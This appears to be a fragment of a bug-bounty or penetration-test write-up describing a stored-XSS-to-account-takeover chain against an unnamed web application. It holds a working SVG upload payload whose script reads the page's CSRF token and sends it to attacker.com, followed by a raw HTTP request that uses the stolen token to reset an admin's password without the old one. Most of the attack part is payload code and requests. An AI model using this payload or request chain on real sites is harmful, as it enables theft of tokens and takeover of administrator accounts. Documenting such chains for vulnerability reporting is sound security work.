Same low bugs #2 and #3, but different chain
Step 1 – Attacker embeds CSRF token stealer in SVG
svg

<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    const csrf = document.querySelector('meta[name="csrf-token"]').content;
    fetch('https://attacker.com/log?csrf=' + csrf);
  </script>
</svg>

Upload same way as Chain #2.
Step 2 – Victim (admin) views attacker’s profile (e.g., report review)

Attacker gets CSRF token.
Step 3 – Change victim’s password without old password
http

POST /api/v1/user/change-password HTTP/1.1
Host: target.com
Cookie: session=<attacker_session>
X-CSRF-Token: <stolen_token>
Content-Type: application/json

{
  "user_id": "admin_456",
  "new_password": "Owned@2026"
}

✅ Result: Admin account taken over directly.
